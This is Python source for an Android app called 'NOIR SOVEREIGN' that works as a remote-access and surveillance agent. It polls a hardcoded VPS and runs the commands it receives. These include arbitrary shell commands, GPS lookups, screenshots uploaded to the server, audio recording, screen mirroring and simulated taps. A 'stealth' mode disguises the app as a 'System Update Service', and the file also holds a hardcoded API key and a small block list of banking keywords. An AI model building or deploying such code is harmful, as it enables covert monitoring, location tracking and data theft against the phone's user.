"""
NOIR SOVEREIGN MOBILE CORE v21.1.0 [NATIVE HYBRID]
====================================================
Architecture: Kivy (UI/Polling) + Java Native Service (Mirror/Audio)
Target: Redmi Note 14 (HyperOS / arm64-v8a / Android 14)
"""

import os, re, sys, time, threading, socket, traceback, base64, requests, json
try:
    import websocket
except:
    pass
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─── CRASH LOG ───────────────────────────────────────────────────────────────
CRASH_LOG = "/sdcard/noir_debug.txt"
def log_crash(msg):
    try:
        with open(CRASH_LOG, "a") as f: f.write(f"{msg}\n")
    except: print(msg)

sys.excepthook = lambda *a: log_crash("".join(traceback.format_exception(*a)))
try:
    with open(CRASH_LOG, "a") as f: f.write("\n--- NOIR v21.1.0 BOOTING ---\n")
except: pass

# ─── KIVY IMPORTS ────────────────────────────────────────────────────────────
try:
    log_crash("Checking Kivy...")
    import kivy
    log_crash("Checking PyJnius...")
    from jnius import autoclass
    log_crash("Dependencies OK.")
except Exception as e:
    log_crash(f"DEPENDENCY ERROR: {e}")
    sys.exit(1)

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.button import Button
from kivy.graphics import Color, Rectangle
from kivy.uix.textinput import TextInput
from kivy.uix.gridlayout import GridLayout

# ─── CONFIG ──────────────────────────────────────────────────────────────────
VPS_BASE  = "http://"+os.environ.get("NOIR_VPS_IP", "8.215.23.17")
API_KEY   = "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026"
DEVICE_ID = "REDMI_NOTE_14"

session = requests.Session()
session.mount("http://", HTTPAdapter(max_retries=Retry(total=5, backoff_factor=1, status_forcelist=[502,503,504])))

OFFLINE_LOG = "/sdcard/noir_offline.log"
FINANCE_APPS = [
    "com.bca","id.co.bni.newmobile","id.co.bri.brimo","com.bankmandiri.livin",
    "com.btpn.jenius","id.dana","com.btpns.mobile"
]

# ─── LOGGING ─────────────────────────────────────────────────────────────────
def noir_log(msg, level="INFO"):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}][{level}] {msg}"
    print(line)
    try:
        with open(OFFLINE_LOG, "a") as f: f.write(line + "\n")
    except: pass
    def _push():
        try:
            session.post(f"{VPS_BASE}/agent/log",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "level": level, "message": msg},
                timeout=4)
        except: pass
    threading.Thread(target=_push, daemon=True).start()

def is_safe_command(cmd):
    if not cmd: return True
    low = str(cmd).lower()
    blocked = ["bank","pay","wallet","dana","ovo","gopay","bca","mandiri","bri","bni"]
    return not any(k in low for k in blocked)

# ─── NATIVE SERVICE BRIDGE (v21.1.0) ─────────────────────────────────────────
class NativeBridge:
    """
    Bridge dari Python ke NoirNativeService.java via PyJnius.
    Semua operasi Mirror & Audio dijalankan oleh Native Java Service —
    bukan lagi Python shell/screencap yang diblokir HyperOS.
    """
    _service_cls = None
    _activity    = None
    _context     = None

    @classmethod
    def _init(cls):
        if cls._service_cls: return True
        try:
            cls._activity = autoclass("org.kivy.android.PythonActivity").mActivity
            cls._context  = cls._activity.getApplicationContext()
            cls._service_cls = autoclass("org.noir.sovereign.NoirNativeService")
            return True
        except Exception as e:
            log_crash(f"[NativeBridge] Init failed: {e}")
            return False

    @classmethod
    def start_service(cls):
        if not cls._init(): return
        try:
            Intent = autoclass("android.content.Intent")
            Build  = autoclass("android.os.Build")
            intent = Intent(cls._context, cls._service_cls)
            if Build.VERSION.SDK_INT >= 26:
                cls._context.startForegroundService(intent)
            else:
                cls._context.startService(intent)
            noir_log("[NATIVE] NoirNativeService started.")
        except Exception as e:
            log_crash(f"[NativeBridge] start_service error: {e}")

    @classmethod
    def start_mirror(cls):
        """Launches NoirProjectionActivity to get MediaProjection permission, then streams."""
        if not cls._init(): return
        try:
            Intent = autoclass("android.content.Intent")
            proj_cls = autoclass("org.noir.sovereign.NoirProjectionActivity")
            intent = Intent(cls._context, proj_cls)
            intent.addFlags(autoclass("android.content.Intent").FLAG_ACTIVITY_NEW_TASK)
            cls._context.startActivity(intent)
            noir_log("[NATIVE] Mirror permission requested via NoirProjectionActivity.")
        except Exception as e:
            log_crash(f"[NativeBridge] start_mirror error: {e}")

    @classmethod
    def stop_mirror(cls):
        if not cls._init(): return
        try:
            Intent = autoclass("android.content.Intent")
            intent = Intent(cls._context, cls._service_cls)
            intent.setAction("org.noir.sovereign.MIRROR_STOP")
            cls._context.startService(intent)
            noir_log("[NATIVE] Mirror STOP sent.")
        except Exception as e:
            log_crash(f"[NativeBridge] stop_mirror error: {e}")

    @classmethod
    def record_audio(cls, duration=10):
        if not cls._init(): return
        try:
            Intent = autoclass("android.content.Intent")
            Build  = autoclass("android.os.Build")
            intent = Intent(cls._context, cls._service_cls)
            intent.setAction("org.noir.sovereign.AUDIO_START")
            intent.putExtra("duration", int(duration))
            if Build.VERSION.SDK_INT >= 26:
                cls._context.startForegroundService(intent)
            else:
                cls._context.startService(intent)
            noir_log(f"[NATIVE] Audio record {duration}s triggered.")
        except Exception as e:
            log_crash(f"[NativeBridge] record_audio error: {e}")

# ─── SHELL EXECUTOR ──────────────────────────────────────────────────────────
def run_shell(cmd, timeout=15):
    import subprocess
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Timeout {timeout}s"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ─── REPORT RESULT ───────────────────────────────────────────────────────────
def report_result(cmd_id, result):
    try:
        session.post(
            f"{VPS_BASE}/agent/result",
            headers={"Authorization": f"Bearer {API_KEY}"},
            json={
                "command_id": cmd_id, "device_id": DEVICE_ID,
                "success": result.get("success", False),
                "output": result.get("output", ""),
                "error":  result.get("error", ""),
                "data":   result.get("data"),
            },
            timeout=10
        )
    except Exception as e:
        noir_log(f"[SMC] Result delivery failed: {e}", level="ERROR")

# ─── COMMAND EXECUTOR ────────────────────────────────────────────────────────
def execute_command(cmd_data, app_ref):
    cmd_id = cmd_data.get("command_id", "unknown")
    action = cmd_data.get("action", {})
    atype  = action.get("type") or action.get("action", "")
    params = action.get("params", action)
    noir_log(f"[SMC] CMD: {atype} (id={cmd_id[:8]})")
    result = {"success": False, "error": "Unknown action"}

    try:
        # ── Basic ────────────────────────────────────────────
        if atype in ("time", "get_time"):
            result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

        elif atype == "ping":
            result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

        elif atype == "shell":
            cmd = str(params.get("cmd", "echo ok"))
            if not is_safe_command(cmd):
                result = {"success": False, "error": "SECURITY BLOCK"}
            else:
                result = run_shell(cmd)

        elif atype == "gps":
            try:
                from jnius import autoclass
                PythonActivity = autoclass("org.kivy.android.PythonActivity")
                activity = PythonActivity.mActivity
                Context = autoclass("android.content.Context")
                lm = activity.getSystemService(Context.LOCATION_SERVICE)
                loc = lm.getLastKnownLocation("gps") or lm.getLastKnownLocation("network")
                if loc:
                    lat, lon = loc.getLatitude(), loc.getLongitude()
                    result = {"success": True, "output": f"GPS: {lat},{lon}",
                              "data": {"lat": lat, "lon": lon}}
                else:
                    result = {"success": False, "error": "No GPS fix yet"}
            except Exception as e:
                result = {"success": False, "error": str(e)}

        # ── NATIVE Mirror ────────────────────────────────────
        elif atype == "mirror_start":
            NativeBridge.start_mirror()
            result = {"success": True, "output": "Native mirror requested — permission dialog may appear."}

        elif atype == "mirror_stop":
            NativeBridge.stop_mirror()
            result = {"success": True, "output": "Native mirror stopped."}

        # ── NATIVE Audio ─────────────────────────────────────
        elif atype == "audio_record":
            duration = int(params.get("duration", 10))
            NativeBridge.record_audio(duration)
            result = {"success": True, "output": f"Native audio recording {duration}s started."}

        # ── Screenshot (single frame via screencap or Kivy) ──
        elif atype in ("screenshot", "capture"):
            parent = "/sdcard/noir_tmp"
            os.makedirs(parent, exist_ok=True)
            path = os.path.join(parent, f"shot_{int(time.time())}.png")
            run_shell(f"screencap -p {path}", timeout=5)
            if not os.path.exists(path) or os.path.getsize(path) < 100:
                from kivy.core.window import Window
                Window.screenshot(name=path)
                for _ in range(20):
                    if os.path.exists(path) and os.path.getsize(path) > 0: break
                    time.sleep(0.1)
            jpeg = path.replace(".png", ".jpg")
            upload_path = None
            if os.path.exists(path) and os.path.getsize(path) > 100:
                try:
                    from PIL import Image
                    with Image.open(path) as img:
                        if img.mode != "RGB": img = img.convert("RGB")
                        img.thumbnail((960, 960))
                        img.save(jpeg, "JPEG", quality=55)
                    upload_path = jpeg
                except Exception as e:
                    noir_log(f"PIL Error: {e}", level="ERROR")
                    upload_path = path
            else:
                upload_path = path
                
            if upload_path and os.path.exists(upload_path) and os.path.getsize(upload_path) > 0:
                with open(upload_path, "rb") as f:
                    r = session.post(
                        f"{VPS_BASE}/agent/upload?device_id={DEVICE_ID}",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        files={"file": ("screenshot.jpg", f, "image/jpeg")},
                        timeout=30)
                if r.status_code == 200:
                    key = r.json().get("key", "")
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                else:
                    result = {"success": False, "error": f"Upload HTTP {r.status_code}"}
            else:
                result = {"success": False, "error": "Screenshot file not created"}
            for p in [path, jpeg]:
                try: os.remove(p)
                except: pass

        elif atype in ("tap",):
            x, y = params.get("x", 0), params.get("y", 0)
            run_shell(f"input tap {x} {y}", timeout=5)
            result = {"success": True, "output": f"Tapped ({x},{y})"}

        elif atype == "stealth":
            state = params.get("enabled", False)
            Clock.schedule_once(lambda dt: app_ref.toggle_stealth(state), 0)
            result = {"success": True, "output": f"Stealth: {'ON' if state else 'OFF'}"}

        elif atype == "auto_update":
            result = {"success": True, "output": "Native service is self-healing via START_STICKY."}

    except Exception as e:
        result = {"success": False, "error": str(e)}
        noir_log(f"[SMC] Exec Error [{atype}]: {e}", level="ERROR")

    report_result(cmd_id, result)

# ─── UI SCREENS ──────────────────────────────────────────────────────────────
class DashboardScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation="vertical", padding=10, spacing=5)
        with layout.canvas.before:
            Color(0, 0, 0, 1)
            Rectangle(size=(2000, 2000), pos=(0, 0))
            # Glowing accent pulse
            Color(0, 0.95, 1, 0.05)
            Rectangle(size=(2000, 400), pos=(0, 0))
        
        self.status_label = Label(text="NOIR v21.1.0 NATIVE — Initializing...",
                                  font_size="13sp", color=(0, 1, 1, 1),
                                  font_name="Roboto", # or default bold
                                  size_hint_y=None, height=36)
        layout.add_widget(self.status_label)
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN v21.1.0[/b]\n[color=00f2ff]NEURAL LINK ESTABLISHED[/color]\nStatus: [color=ffaa00]WAITING...[/color]",
            markup=True, font_size="12sp", halign="left", valign="top", size_hint_y=None)
        self.log_label.bind(texture_size=self.log_label.setter("size"))
        sv = ScrollView(); sv.add_widget(self.log_label)
        layout.add_widget(sv)
        core_btn = Button(text="ENTER SOVEREIGN CORE", size_hint_y=None, height=48,
                          background_color=(0, 0.7, 1, 1))
        core_btn.bind(on_press=lambda x: setattr(App.get_running_app().root, "current", "core"))
        layout.add_widget(core_btn)
        self.add_widget(layout)

class SovereignCoreScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation="vertical", padding=10, spacing=8)
        with layout.canvas.before:
            Color(0.02, 0.02, 0.05, 1)
            Rectangle(size=(2000, 2000), pos=(0, 0))
        self.feedback = Label(text="Awaiting orders...", font_size="12sp",
                              color=(0.5, 0.5, 0.5, 1), size_hint_y=None, height=30)
        layout.add_widget(Label(text="[b]SOVEREIGN CORE — NATIVE ENGINE[/b]",
                                markup=True, font_size="15sp", color=(0, 0.82, 1, 1),
                                size_hint_y=None, height=40))
        layout.add_widget(self.feedback)
        grid = GridLayout(cols=2, spacing=10, size_hint_y=None, height=140)
        for label, action in [
            ("📸 SCREENSHOT", "screenshot"),
            ("🎵 RECORD AUDIO", "audio"),
            ("🖥 MIRROR START",  "mirror_start"),
            ("⏹ MIRROR STOP", "mirror_stop"),
        ]:
            btn = Button(text=label, background_color=(0, 0.95, 1, 0.2),
                         color=(0, 0.95, 1, 1), font_size="12sp", bold=True)
            btn.bind(on_press=lambda x, a=action: self._trigger(a))
            grid.add_widget(btn)
        layout.add_widget(grid)
        back = Button(text="← DASHBOARD", size_hint_y=None, height=42,
                      background_color=(0, 0.25, 0.5, 1))
        back.bind(on_press=lambda x: setattr(App.get_running_app().root, "current", "dashboard"))
        layout.add_widget(back)
        self.add_widget(layout)

    def _trigger(self, action):
        app = App.get_running_app()
        if action == "audio":
            NativeBridge.record_audio(10)
            self.feedback.text = "Native audio recording started (10s)"
        elif action == "mirror_start":
            NativeBridge.start_mirror()
            self.feedback.text = "Mirror permission requested..."
        elif action == "mirror_stop":
            NativeBridge.stop_mirror()
            self.feedback.text = "Mirror stopped."
        elif action == "screenshot":
            self.feedback.text = "Screenshot triggered..."
            threading.Thread(
                target=execute_command,
                args=({"command_id": f"ui_{int(time.time())}", "action": {"type": "screenshot"}}, app),
                daemon=True
            ).start()

# ─── MAIN APP ────────────────────────────────────────────────────────────────
class SovereignApp(App):
    def build(self):
        self.version     = "21.1.0"
        self.start_time  = time.time()
        self.is_stealth  = False
        self.overlay_active = False

        self.sm = ScreenManager(transition=FadeTransition())
        self.dashboard = DashboardScreen(name="dashboard")
        self.core_screen = SovereignCoreScreen(name="core")
        self.sm.add_widget(self.dashboard)
        self.sm.add_widget(self.core_screen)
        self.log_label    = self.dashboard.log_label
        self.status_label = self.dashboard.status_label
        return self.sm

    def on_start(self):
        Clock.schedule_once(lambda dt: self._deferred_start(), 1)

    def _deferred_start(self):
        try:
            self._request_permissions()
            self._acquire_wakelock()
            NativeBridge.start_service()         # Start native Java service
            self._register()
            Clock.schedule_once(lambda dt: threading.Thread(
                target=self._heartbeat_tick, daemon=True).start(), 6)
            Clock.schedule_interval(
                lambda dt: threading.Thread(target=self._heartbeat_tick, daemon=True).start(), 30) # Polling dikurangi ke 30s (Fallback)
            
            # --- PRIORITAS 1: WebSocket Real-time Link ---
            threading.Thread(target=self._ws_listener, daemon=True).start()
            
            threading.Thread(target=self._watchdog, daemon=True).start()
            self.status_label.text = f"NOIR v{self.version} — ONLINE"
        except Exception as e:
            self.status_label.text = f"Startup Error: {e}"
            log_crash(f"Startup Error: {e}")

    def _register(self):
        for _ in range(3):
            try:
                r = session.post(
                    f"{VPS_BASE}/agent/register",
                    headers={"Authorization": f"Bearer {API_KEY}"},
                    json={"device_id": DEVICE_ID, "agent": f"Noir SMC v{self.version}",
                          "stats": {"cpu": 0, "ram": 0}},
                    timeout=10)
                if r.status_code == 200:
                    noir_log(f"[SMC] Registered: {DEVICE_ID}")
                    return
            except: time.sleep(2)

    def _heartbeat_tick(self):
        try:
            ram = 0
            try:
                with open("/proc/meminfo") as f:
                    mem = {l.split(":")[0]: int(l.split(":")[1].split()[0])
                           for l in f if ":" in l}
                ram = round(100 * (1 - mem.get("MemAvailable",0) / max(mem.get("MemTotal",1),1)), 1)
            except: pass

            resp = session.post(
                f"{VPS_BASE}/agent/poll?device_id={DEVICE_ID}&client_type=main",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"stats": {"ram": ram, "cpu": 0, "version": self.version}},
                timeout=12)

            if resp.status_code == 200:
                Clock.schedule_once(lambda dt: self._set_status("ONLINE", "00ff88"), 0)
                for cmd in resp.json().get("commands", []):
                    threading.Thread(target=execute_command,
                                     args=(cmd, self), daemon=True).start()
            else:
                Clock.schedule_once(lambda dt: self._set_status("LINK SEVERED", "ff4444"), 0)
        except Exception as e:
            Clock.schedule_once(lambda dt: self._set_status("OFFLINE", "ff4444"), 0)
            noir_log(f"[LINK] Heartbeat failed: {e}", level="WARNING")

    def _ws_listener(self):
        """Koneksi WebSocket persisten untuk instruksi instan."""
        ws_url = VPS_BASE.replace("http", "ws") + f"/ws/agent?device_id={DEVICE_ID}"
        noir_log(f"[WS] Initiating high-speed link to {ws_url}")
        
        while True:
            try:
                def on_message(ws, message):
                    try:
                        payload = json.loads(message)
                        # Eksekusi instan jika ada perintah dari dashboard
                        if "action" in payload:
                            noir_log(f"[WS] High-speed command received: {payload['action'].get('type')}")
                            threading.Thread(target=execute_command, args=(payload, self), daemon=True).start()
                    except Exception as e:
                        noir_log(f"[WS] Payload error: {e}", "WARNING")

                ws = websocket.WebSocketApp(
                    ws_url,
                    header=[f"Authorization: Bearer {API_KEY}"],
                    on_message=on_message
                )
                ws.run_forever()
            except Exception as e:
                noir_log(f"[WS] Connection failed: {e}. Retrying in 10s...")
            time.sleep(10)

    def _set_status(self, txt, col):
        try:
            self.log_label.text = re.sub(
                r"Status:.*",
                f"Status: [color={col}]{txt}[/color]",
                self.log_label.text, count=1)
        except: pass

    def _log(self, msg):
        noir_log(msg)
        Clock.schedule_once(lambda dt: self._append_log(msg), 0)

    def _append_log(self, msg):
        try:
            lines = self.log_label.text.split("\n")
            if len(lines) > 30: lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = "\n".join(lines)
        except: pass

    def _request_permissions(self):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.RECORD_AUDIO, Permission.CAMERA,
                Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
                Permission.ACCESS_FINE_LOCATION,
            ])
        except Exception as e:
            log_crash(f"Permissions error: {e}")

    def _acquire_wakelock(self):
        try:
            PythonActivity = autoclass("org.kivy.android.PythonActivity")
            activity = PythonActivity.mActivity
            Context = autoclass("android.content.Context")
            PowerManager = autoclass("android.os.PowerManager")
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "NoirSovereign:SentinelLock")
            self.wakelock.acquire()
            noir_log("[SMC] WakeLock: ACTIVE")
        except Exception as e:
            log_crash(f"WakeLock error: {e}")

    def _watchdog(self):
        noir_log("[SENTINEL] Watchdog ACTIVE")
        fails = 0
        while True:
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=4)
                if fails > 0: noir_log("[SENTINEL] Link restored.")
                fails = 0
                self._flush_offline_logs()
            except:
                fails += 1
                if fails >= 3:
                    run_shell("svc wifi enable")
                    run_shell("svc data enable")
            time.sleep(60)

    def _flush_offline_logs(self):
        if not os.path.exists(OFFLINE_LOG): return
        try:
            with open(OFFLINE_LOG) as f: lines = f.readlines()
            if lines:
                noir_log(f"[SENTINEL] Flushed {len(lines)} offline logs.")
                open(OFFLINE_LOG, "w").close()
        except: pass

    def toggle_stealth(self, state):
        self.is_stealth = state
        if state:
            self.sm.clear_widgets()
            lbl = Label(text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle",
                        color=(0.3, 0.3, 0.3, 1), font_size="12sp")
            self.sm.add_widget(lbl)
        else:
            self.sm.clear_widgets()
            self.sm.add_widget(self.dashboard)
            self.sm.add_widget(self.core_screen)

if __name__ == "__main__":
    noir_log("NOIR SOVEREIGN v21.1.0 [NATIVE HYBRID] STARTING...")
    SovereignApp().run()
